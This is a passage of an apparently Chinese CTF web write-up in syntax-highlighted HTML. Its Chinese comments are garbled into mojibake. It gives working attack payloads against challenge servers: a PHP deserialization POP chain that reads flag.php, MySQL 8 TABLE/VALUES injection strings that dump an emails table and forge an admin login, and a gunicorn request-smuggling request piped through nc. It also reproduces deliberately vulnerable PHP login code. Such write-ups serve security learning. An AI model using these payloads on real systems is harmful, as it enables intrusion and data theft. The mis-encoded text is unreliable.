comment">//è‡ªåŠ¨è°ƒç”¨è¯¥å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæ•°ç»„èµ‹å€¼ç»™effortï¼Ÿ</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//åœ¨è¯»å–ä¸å¯è®¿é—®å¾—å±æ€§æ—¶è§¦å‘ï¼Œå°†ä¼ å…¥çš„å€¼ä¼ å…¥get()å‡½æ•°</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">effort</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">/**********************Try to See flag.php*****************************/</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2ã€è§£é¢˜æ€è·¯"><a href="#2ã€è§£é¢˜æ€è·¯" class="headerlink" title="2ã€è§£é¢˜æ€è·¯"></a>2ã€è§£é¢˜æ€è·¯</h3><p>å°†å®ä½“å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œä¾æ¬¡è§¦å‘__construct($file)â€”â€”&gt;__toString()â€”â€”-&gt;($effort)__get($key)â€”â€“&gt;__invoke()</p><p>æ³¨æ„ï¼šå½“payloadä¸­å­˜åœ¨ç§æœ‰å±æ€§æ—¶</p><h3 id="3ã€payload"><a href="#3ã€payload" class="headerlink" title="3ã€payload"></a>3ã€payload</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Road_is_Long</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$page</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token comment">//ç”¨äºæŒ‡å‘Make_a_Changeä¸­çš„effort</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">page</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"karsa"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Make_a_Change</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$effort</span><span class="token punctuation">;</span><span class="token comment">//å°†æŒ‡å‘çš„å¯¹è±¡ç»“æ„åŒ–çš„ç»“æœæ”¾åˆ°æ•°ç»„ä¸­array()ï¼Ÿ</span><span class="token punctuation">&#125;</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Try_Work_Hard</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=flag.php'</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è§¦å‘__toString()</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Make_a_Change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//stringæŒ‡å‘å¯¹è±¡</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token keyword type-declaration">string</span><span class="token operator">-></span><span class="token property">effort</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Try_Work_Hard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//string->effortä¸å¯è®¿é—®ï¼Œè§¦å‘__get($key)æŒ‡å‘effortï¼Œè¿”å›ä¸€ä¸ªæ–¹æ³•ï¼ˆä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œ__invoke() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨---->ä¼ å…¥$varçš„å€¼ï¼‰</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//http://59.110.159.206:7050/?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Bs%3A3%3A%22aaa%22%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="MRCTF2020-Ezpopâ€”åºåˆ—åŒ–popé“¾"><a href="#MRCTF2020-Ezpopâ€”åºåˆ—åŒ–popé“¾" class="headerlink" title="MRCTF2020]Ezpopâ€”åºåˆ—åŒ–popé“¾_"></a><a href="https://blog.csdn.net/weixin_43952190/article/details/106016260?ops_request_misc=%7B%22request_id%22:%22165173927916782390531181%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165173927916782390531181&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-106016260.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=ctfpop&spm=1018.2226.3001.4187">MRCTF2020]Ezpopâ€”åºåˆ—åŒ–popé“¾_</a></h3><p><a href="https://blog.csdn.net/SuichI314/article/details/121788478?ops_request_misc=%7B%22request_id%22:%22165191947416782425140870%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165191947416782425140870&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-20-121788478-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=web+pop%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">Web - popé“¾æ„é€ </a></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="web4ã€"><a href="#web4ã€" class="headerlink" title="web4ã€"></a>web4ã€</h2><p>[(74æ¡æ¶ˆæ¯) Pwnhub2021ä¸ƒæœˆèµ›NewSqlï¼ˆmysql8æ³¨å…¥ï¼‰_bfengjçš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/rfrder/article/details/118726022">https://blog.csdn.net/rfrder/article/details/118726022</a>)</p><blockquote><p>é¢˜ç›®æè¿°ï¼š</p><p>Beaxiaçš„é‚®ç®±åœ°å€å¿˜è®°äº†ï¼Œä½ èƒ½å¸®å¿™æ‰¾æ‰¾å—ï¼Ÿ</p><p>Where is the database?<br>try ?id</p></blockquote><p>sqlæ³¨å…¥ï¼Œæ³¨å…¥ç‚¹idï¼Ÿ</p><blockquote><ol><li>idæµ‹è¯•åˆ°9å‰éƒ½æœ‰å›æ˜¾</li><li>8æ˜¯å…³é”®å­—â€”â€”-&gt;SQL8ç‰¹æ€§ï¼ˆtableæ³¨å…¥ï¼‰</li><li><a href="http://59.110.159.206:7010/?id=9">http://59.110.159.206:7010/?id=9</a></li></ol></blockquote><p><a href="https://www.anquanke.com/post/id/231627">SQL8ç‰¹æ€§å‚è€ƒ</a></p><blockquote><p>ä½¿ç”¨åœºæ™¯ï¼šå½“selectè¢«ç¦ç”¨æ—¶ï¼Œä½¿ç”¨TABLE VALUESè¯­å¥ï¼Œ</p></blockquote><p>ç”±äºTABLEå‘½ä»¤å’ŒVALUESè¿”å›çš„éƒ½æ˜¯è¡¨æ•°æ®ï¼Œå®ƒä»¬æ‰€è¿”å›çš„æ•°æ®å¯ä»¥é€šè¿‡UNIONè¯­å¥è”åˆèµ·æ¥ï¼Œå½“åˆ—æ•°ä¸å¯¹æ—¶ä¼šæŠ¥é”™ï¼Œæ ¹æ®è¿™ç‚¹å¯ä»¥åˆ¤æ–­åˆ—æ•°</p><h3 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h3><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">ä¼ å‚<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">8</span>ï¼Ÿå¾—åˆ°ä¿¡æ¯ï¼šCan you find beaxia's email<span class="token operator">?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">åŸºäºSQL8 <span class="token keyword">table</span>ã€<span class="token keyword">values</span> ç‰¹æ€§æ„é€ payloadï¼š?id<span class="token operator">=</span><span class="token number">8</span> <span class="token keyword">union</span> <span class="token keyword">table</span> emails <span class="token keyword">limit</span> <span class="token number">8</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#</span>å¾—åˆ°ï¼šypHeMPardErE<span class="token punctuation">.</span>zip<span class="token variable">@beaxia.cn</span>æ³¨æ„<span class="token comment">----->ypHeMPardErE.zipæ˜¯ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶ï¼Œurlè¾“å…¥ï¼Œå¾—åˆ°å‹ç¼©åŒ…</span>å‹ç¼©åŒ…ä¸­æ˜¯phpæºç <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"./config.php"</span><span class="token punctuation">;</span><span class="token comment">// error_reporting(0);</span><span class="token comment">// highlight_file(__FILE__);</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connection failed: "</span> <span class="token operator">.</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Where is the database?"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"try ?id"</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|>|&lt;|;|"|\^|\||\ |\'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where id=<span class="token interpolation"><span class="token variable">$id</span></span>"</span><span class="token punctuation">;</span>    <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/select/is'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token operator">!==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No select!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span>     <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3>"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/h3>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;br>Error!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sqlWaf</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'damn hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND passwd= '$&#123;passwd&#125;'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username or passwd wrong, are you admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user not exist or wrong passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…³é”®ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND passwd= '$&#123;passwd&#125;'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$passwd</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username or passwd wrong, are you admin?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"wrong user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"user not exist or wrong passwd"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h3><p>postä¼ å‚å†…å®¹ä¸­ï¼š</p><ol><li><p>usernameå‚æ•°å€¼ä¸ºadmin</p></li><li><p>passwdå‚æ•°å€¼ä¸ºæ‰€æŸ¥è¯¢å­—æ®µçš„å€¼</p></li></ol><h3 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>:username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">values</span> <span class="token keyword">row</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>passwd<span class="token operator">=</span>admin<span class="token number">2</span>ï¼šusername<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union values row('</span>admin<span class="token string">','</span>admin<span class="token string">','</span>admin'<span class="token punctuation">)</span><span class="token comment">#&amp;passwd=admin</span>ç¬¬ä¸€ä¸ª<span class="token number">23</span><span class="token operator">%</span>æˆ‘åœ¨ä½¿ç”¨æ—¶æ²¡æœ‰å›æ˜¾ï¼Œäºæ˜¯å°†<span class="token number">23</span><span class="token operator">%</span>æ¢ä¸ºäº†<span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p><a href="https://www.linuxlz.com/aqld/2359.html">gunicorn 20.0.4 è¯·æ±‚èµ°ç§æ¼æ´ç®€æï¼ˆå«å¤ç°ç¯å¢ƒ&amp;Pocï¼‰-Linuxå®éªŒå®¤ (linuxlz.com)</a></p><h3 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">echo <span class="token operator">-</span>en <span class="token string">"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Length: 123\r\nSec-Websocket-Key1: x\r\n\r\nxxxxxxxxGET /fl4g HTTP/1.1\r\nHost: 127.0.0.1/fl4g\r\nX-Forwarded-For: 127.0.0.1\r\nsecr3t_ip: 127.0.0.1\r\nContent-Length: 35\r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n"</span> <span class="token operator">|</span> nc <span class="token number">59.110</span><span class="token number">.159</span><span class="token number">.206</span> <span class="token number">7020</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>å‰è¨€<br>åœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œæˆ˜é˜Ÿé‡Œçš„å¸ˆå‚…ç»™æˆ‘å‘äº†ä¸€é“ä¹‹å‰æ²¡é‡è§è¿‡çš„ååºåˆ—åŒ–é¢˜ï¼Œå¼•å‡ºäº†åŸç”Ÿç±»è¿™ä¸ªæ–¹é¢ã€‚è¿™ä¸€çŸ¥è¯†ç‚¹åœ¨åé¢åˆ·é¢˜æ—¶ä¹Ÿä¼šé‡åˆ°ï¼Œæå‰å­¦ä¹ ä¸€ä¸‹ã€‚å€Ÿè¿™é“é¢˜ï¼Œå¯¹åŸç”Ÿç±»çš„çŸ¥è¯†ç‚¹è¿›è¡Œä¸€ä¸‹å­¦ä¹ ä¸è®°å½•ã€‚</p><p>ä¾‹é¢˜ï¼š</p> <pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$un0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$un4</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">un2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span> <span class="token operator">-></span> <span class="token function">Givemeanew</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">un3</span> <span class="token operator">===</span> <span class="token string 